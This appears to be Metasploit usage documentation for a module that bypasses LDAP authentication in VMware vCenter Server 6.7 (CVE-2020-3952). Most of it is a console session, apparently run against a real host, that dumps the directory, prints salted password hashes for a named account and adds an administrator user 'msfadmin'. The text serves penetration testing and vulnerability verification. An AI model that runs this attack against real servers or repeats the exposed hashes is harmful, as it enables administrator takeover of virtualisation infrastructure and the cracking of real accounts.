## Vulnerable Application

### Description

This module bypasses LDAP authentication in VMware vCenter Server's
vmdir service to add an arbitrary administrator user. Version 6.7
prior to the 6.7U3f update is vulnerable, only if upgraded from a
previous release line, such as 6.0 or 6.5.

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Add

Add an admin user to the vCenter Server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### USERNAME

Set this to the username for the new admin user.

### PASSWORD

Set this to the password for the new admin user.

### ConnectTimeout

You may configure the timeout for LDAP connects if necessary. The
default is 10.0 seconds and should be more than sufficient.

## Scenarios

### VMware vCenter Server 6.7 virtual appliance on ESXi

```
msf5 > use auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > options

Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   BASE_DN                    no        LDAP base DN if you already have it
   PASSWORD                   no        Password of admin user to add
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     389              yes       The target port
   USERNAME                   no        Username of admin user to add


Auxiliary action:

   Name  Description
   ----  -----------
   Add   Add an admin user


msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
rhosts => [redacted]
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set username msfadmin
username => msfadmin
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set password msfadmin
password => msfadmin
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
[*] Running module against [redacted]

[*] Using auxiliary/gather/vmware_vcenter_vmdir_ldap as check
[*] Discovering base DN automatically
[*] Searching root DSE for base DN
dn: cn=DSE Root
namingcontexts: dc=vsphere,dc=local
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.1
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.2
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.3
supportedcontrol: 1.2.840.113556.1.4.417
supportedcontrol: 1.2.840.113556.1.4.319
supportedldapversion: 3
supportedsaslmechanisms: GSSAPI

[+] Discovered base DN: dc=vsphere,dc=local
[*] Dumping LDAP data from vmdir service at [redacted]:389
[+] [redacted]:389 is vulnerable to CVE-2020-3952
[*] Storing LDAP data in loot
[+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002255_default_[redacted]_VMwarevCenterS_975097.txt
[*] Password and lockout policy:
vmwpasswordchangeautounlockintervalsec: [redacted]
vmwpasswordchangefailedattemptintervalsec: [redacted]
vmwpasswordchangemaxfailedattempts: [redacted]
vmwpasswordlifetimedays: [redacted]
vmwpasswordmaxidenticaladjacentchars: [redacted]
vmwpasswordmaxlength: [redacted]
vmwpasswordminalphabeticcount: [redacted]
vmwpasswordminlength: [redacted]
vmwpasswordminlowercasecount: [redacted]
vmwpasswordminnumericcount: [redacted]
vmwpasswordminspecialcharcount: [redacted]
vmwpasswordminuppercasecount: [redacted]
vmwpasswordprohibitedpreviouscount: [redacted]

[+] Credentials found: CN=HynekAdmin,CN=Users,DC=vsphere,DC=local:$dynamic_82$43717fbfb6d81163b5f8f7a479311ad0904134bc086a02e090b3bb5322cc0166c91163920575d4b6a2790e5189a83b71757d69a003c9856212ca6a8e3dc6e407$HEX$1d174c634c8bf44558e132c3f0d8b401
[+] Credentials found: CN=HynekAdmin,CN=Users,DC=vsphere,DC=local:$dynamic_82$a702505b8a67b45065a6a7ff81ec6685f08d06568e478e1a7695484a934b19a28b94f58595d4de68b27771362bc2b52444a0ed03e980e11ad5e5ffa6daa9e7e1$HEX$171ada255464a439569352c60258e7c6
[*] Bypassing LDAP auth in vmdir service at [redacted]:389
[*] Adding admin user msfadmin with password msfadmin
[+] Added user msfadmin, so auth bypass was successful!
[+] Added user msfadmin to admin group
[*] Auxiliary module execution completed
msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) >
```
